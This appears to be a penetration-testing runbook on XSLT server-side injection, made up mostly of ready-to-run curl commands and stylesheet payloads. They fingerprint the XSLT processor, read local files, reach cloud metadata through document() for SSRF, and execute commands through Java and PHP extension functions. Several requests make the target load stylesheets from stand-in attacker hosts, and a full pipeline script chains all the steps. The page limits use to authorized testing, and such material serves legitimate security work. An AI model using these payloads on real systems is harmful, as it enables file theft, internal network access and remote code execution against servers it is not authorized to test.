---
title: "XSLT Server-Side Injection"
description: "Abusing server-side XSLT processing with extension functions, document() and EXSLT to read files, hit internal hosts, and escalate to RCE."
phase: Web
order: 78
tags:
  - xslt
  - injection
  - ssrf
  - rce
tools:
  - burp suite
  - saxon
updated: 2026-10-01
---

XSLT transforms XML into other formats. When an attacker can supply or influence the stylesheet, extension functions can read files, make network calls, and on some stacks execute code. This runbook confirms stylesheet control, escalates to file read and SSRF, then probes extension namespaces — on **in-scope** targets only.

## 1. Spot XSLT processing

Look for report/export builders, PDF generators, SOAP gateways, and any parameter taking a stylesheet URL.

```bash
curl -s -X POST https://target.com/report -H "Content-Type: application/xml" \
  --data '<root><name>test</name></root>' | grep -iE "xslt|xalan|saxon|libxslt"

curl -s -X POST https://target.com/report -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="http://ATTACKER/x.xsl"?><root/>'
```

## 2. Confirm stylesheet control

Send a minimal stylesheet and see whether your template is applied.

```bash
cat > probe.xsl <<'EOF'
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <out><xsl:value-of select="system-property('xsl:version')"/></out>
  </xsl:template>
</xsl:stylesheet>
EOF
curl -s -X POST https://target.com/transform \
  -H "Content-Type: application/xml" --data-binary @probe.xsl | head -n 40

# Or point the app at a stylesheet URL you control
curl -s -X POST https://target.com/transform -H "Content-Type: application/xml" \
  --data '<?xml-stylesheet type="text/xsl" href="http://ATTACKER/probe.xsl"?><root/>'
```

## 3. File read and SSRF via document()

`document()` and `unparsed-text()` fetch external resources.

```bash
cat > read.xsl <<'EOF'
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <out>
      <host><xsl:value-of select="unparsed-text('file:///etc/hostname')"/></host>
      <meta><xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/></meta>
    </out>
  </xsl:template>
</xsl:stylesheet>
EOF
curl -s -X POST https://target.com/transform \
  -H "Content-Type: application/xml" --data-binary @read.xsl | head -n 40

# SSRF proof against your own OOB listener (python3 -m http.server 8000)
curl -s -X POST https://target.com/transform -H "Content-Type: application/xml" \
  --data '<?xml-stylesheet type="text/xsl" href="http://YOUR_IP:8000/oob.xsl"?><root/>'
```

## 4. Extension functions and RCE

Java processors (Xalan, Saxon) and PHP's XSLT may expose extension functions:
`java:java.lang.Runtime.getRuntime().exec('id')` or `php:function('system','id')`.

```bash
cat > rce.xsl <<'EOF'
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:java="http://xml.apache.org/xalan/java">
  <xsl:template match="/">
    <out><xsl:value-of select="java:java.lang.Runtime.getRuntime().exec('id')"/></out>
  </xsl:template>
</xsl:stylesheet>
EOF
curl -s -X POST https://target.com/transform \
  -H "Content-Type: application/xml" --data-binary @rce.xsl | head -n 40
```

Enumerate the processor/version from error banners; combine `document()` SSRF with an internal service only when explicitly authorized. Validate payloads offline first:

```bash
saxon -s:input.xml -xsl:read.xsl -o:out.html 2>&1 | head -n 20
```

## Full pipeline

```bash
T="https://target.com/transform"; H="Content-Type: application/xml"
# 1. Fingerprint the processor
curl -s -X POST "$T" -H "$H" --data '<root/>' | grep -iE "xslt|xalan|saxon|libxslt"
# 2. Confirm transform control
curl -s -X POST "$T" -H "$H" --data-binary @probe.xsl | head -n 40
# 3. File read
curl -s -X POST "$T" -H "$H" --data-binary @read.xsl | head -n 40
# 4. SSRF proof (start `python3 -m http.server 8000` first)
curl -s -X POST "$T" -H "$H" \
  --data '<?xml-stylesheet type="text/xsl" href="http://YOUR_IP:8000/oob.xsl"?><root/>'
# 5. Validate offline before sending
saxon -s:input.xml -xsl:read.xsl -o:out.html 2>&1 | head -n 20
```

## Ethics & legality

- Only test XSLT surfaces inside an authorized scope; RCE attempts require explicit written permission — otherwise stop at read-only proof.
- Prove file read with a harmless file (`/etc/hostname`) and SSRF with your own listener.
- Avoid touching cloud metadata beyond a reachability proof; mint nothing.
- Keep every stylesheet, request, and callback timestamped as report evidence.
